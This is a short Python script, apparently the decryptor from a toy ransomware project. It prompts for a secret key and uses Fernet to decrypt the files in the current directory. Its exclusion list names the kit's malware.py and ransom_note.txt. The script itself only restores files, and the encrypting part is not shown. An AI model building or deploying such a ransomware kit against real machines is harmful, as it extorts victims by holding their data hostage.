#!/usr/bin/env python3



import os

import base64

from cryptography.fernet import Fernet



files = []



for file in os.listdir():

    if file in ["malware.py", "malware","thekey.key", "decrypt.py", "ransom_note.txt"]:

        continue

    if os.path.isfile(file):

        files.append(file)





with open("thekey.key", "r") as key:

    encoded_key = key.read().strip()



try:

    secretkey = base64.urlsafe_b64decode(encoded_key)

except base64.binascii.Error as e:

    print(f"Error decoding the key: {e}")

    exit()





user_phrase = input("Enter the secretkey to decrypt your files\n").strip()



if base64.urlsafe_b64decode(user_phrase) == secretkey:

    for file in files:

        try:

            with open(file, "rb") as thefile:

                contents = thefile.read()

            contents_decrypted = Fernet(secretkey).decrypt(contents)

            with open(file, "wb") as thefile:

                thefile.write(contents_decrypted)

            print(f"Decrypted {file}")

        except Exception as e:

            print(f"Failed to decrypt {file}: {e}")

else:

    print("Wrong secret key")